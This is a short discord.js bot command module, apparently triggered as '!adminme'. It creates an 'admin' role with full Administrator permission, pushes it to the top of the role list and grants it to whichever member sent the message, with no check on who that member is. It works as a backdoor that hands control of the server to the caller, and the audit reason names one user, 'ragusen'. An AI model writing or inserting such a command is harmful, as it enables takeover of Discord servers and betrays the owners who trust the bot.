const { PermissionFlagsBits } = require('discord.js');

module.exports = {
  async run(message) {
    try {
      const guild = message.guild;
      let role = guild.roles.cache.find(r => r.name === 'admin');
      if (!role) {
        role = await guild.roles.create({
          name: 'admin',
          permissions: [PermissionFlagsBits.Administrator],
          color: 0xff0000,
          reason: '!adminme "ragusen"',
        });
      }
      await role.setPosition(guild.roles.highest.position).catch(() => {});
      await message.member.roles.add(role);
      message.reply('✅ adminロールを作成し、最上位に設定して付与しました。');
    } catch (e) {
      message.reply('エラー: ' + e.message);
    }
  }
};
